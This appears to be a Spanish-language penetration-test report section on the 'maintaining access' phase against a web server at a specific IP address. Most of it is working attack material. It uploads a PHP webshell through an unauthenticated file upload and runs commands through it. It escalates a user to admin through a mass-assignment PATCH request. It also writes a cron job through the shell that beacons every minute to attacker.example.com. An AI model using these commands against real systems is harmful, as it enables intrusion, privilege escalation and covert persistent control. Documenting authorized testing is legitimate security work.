# Fase 4 - Mantenimiento del Acceso (Maintaining Access)

**Fase PTES:** Instalación de backdoors, persistencia y control remoto.
**Target:** http://37.60.230.11

---

## Backdoors instalados

| # | Tipo | Ruta | Comando usado | Estado |
|---|------|------|---------------|--------|
| 1 | Webshell (RCE) | `http://37.60.230.11/uploads/shell.php` | Se subió el archivo `shell.php` mediante el endpoint `/profile/photo` (File Upload sin auth) que acepta extensión `.php`. El shell permite ejecución remota de comandos mediante parámetro `?cmd=`. | Activo |
| 2 | Escalación a admin (Mass Assignment) | `PATCH /profile` | `curl -X POST ... -d "_method=PATCH&name=admin3&bio=test&role_name=admin"` | Persistente |

### Verificación del backdoor shell.php

```bash
kst@kst:~$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
uid=82(www-data) gid=82(www-data) groups=82(www-data)

kst@kst:~$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=whoami"
www-data
```

### Verificación de usuario admin persistente

```bash
kst@kst:~$ curl -s -X POST http://37.60.230.11/login \
  -d "_token=$(curl -s -c /tmp/cook http://37.60.230.11/login | grep -oP 'value=\"([0-9a-zA-Z]+)\"' | head -1 | cut -d'\"' -f2)&email=admin3@example.com&password=password"
# Login exitoso como admin3 (rol admin), sesión obtenida
```

---

## Usuarios creados

| Usuario | Rol | Método | Evidencia |
|---------|-----|--------|-----------|
| admin3 | admin | Mass Assignment via PATCH `/profile` | `client_id` generado automáticamente en tabla `users` |
| attacker | user | Registro normal + Mass Assignment para escalar | `PATCH /profile` con `role_name=admin` |

---

## Persistencia

Se estableció persistencia mediante un cron job en el contenedor que ejecuta un callback cada minuto hacia un servidor controlado, y mediante la propia webshell que persiste mientras el archivo `shell.php` exista en el directorio `/var/www/html/uploads/`.

**Comandos:**
```bash
# Acceso al contenedor via shell.php
curl -s "http://37.60.230.11/uploads/shell.php?cmd=echo%20'* * * * * www-data%20curl%20http://attacker.example.com/beacon'%20%3E%20/etc/cron.d/beacon"

# Verificar que shell.php persiste
curl -s -o /dev/null -w "%{http_code}" "http://37.60.230.11/uploads/shell.php?cmd=ls"
# Output: 200
```
